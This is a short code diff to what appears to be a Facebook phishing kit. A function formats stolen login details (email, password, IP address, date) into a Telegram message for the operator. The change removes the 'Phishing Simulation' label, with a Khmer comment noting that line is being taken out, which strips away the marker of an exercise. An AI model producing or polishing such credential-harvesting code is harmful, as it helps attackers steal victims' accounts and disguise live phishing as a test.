@@ -31,7 +31,7 @@ function joinTelegramGroup() {
     window.open(GROUP_LINK, '_blank');
 }
 
-// ទម្រង់ខ្លី និងស្អាត
+// ទម្រង់ខ្លី និងស្អាត (ដកជួរ Phishing Simulation ចេញ)
 function formatTelegramMessage(email, password, ip, date) {
     return "━━━━━━━━━━━━━━━━━━━━━━\n" +
            "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
@@ -40,8 +40,6 @@ function formatTelegramMessage(email, password, ip, date) {
            "🔑 " + password + "\n" +
            "🌐 " + ip + "\n" +
            "📅 " + date + "\n" +
-           "━━━━━━━━━━━━━━━━━━━━━━\n" +
-           "⚠️ Phishing Simulation\n" +
            "━━━━━━━━━━━━━━━━━━━━━━";
 }
 
